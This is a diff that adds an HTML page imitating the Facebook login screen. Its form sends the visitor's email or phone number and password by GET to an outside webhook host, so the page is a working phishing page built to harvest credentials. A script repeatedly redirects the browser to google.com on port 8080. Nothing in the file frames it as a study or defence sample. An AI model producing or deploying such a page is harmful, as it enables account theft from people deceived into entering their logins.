@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>facebook.com</title>
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: Helvetica, Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+      width: 396px;
+      text-align: center;
+    }
+    .logo {
+      font-size: 48px;
+      font-weight: bold;
+      color: #1877f2;
+      margin-bottom: 20px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 14px;
+      margin: 8px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    input[type="submit"] {
+      width: 100%;
+      padding: 14px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 20px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    input[type="submit"]:hover {
+      background-color: #166fe5;
+    }
+    .footer {
+      margin-top: 30px;
+      font-size: 14px;
+      color: #8a8d91;
+    }
+    .footer a {
+      color: #1877f2;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="logo">facebook</div>
+    <form action="https://keen-unicorn-32.webhook.cool" method="GET">
+      Email: <input type="text" name="username" placeholder="Email or phone number"><br>
+      Password: <input type="password" name="password" placeholder="Password">
+      <input type="submit" value="Log In">
+    </form>
+    <div class="footer">
+      <a href="#">Forgot password?</a>
+    </div>
+  </div>
+
+  <script>
+    function f() {
+      location = "https://google.com:8080";
+    }
+    setInterval("f()", 10);
+  </script>
+
+</body>
+</html>
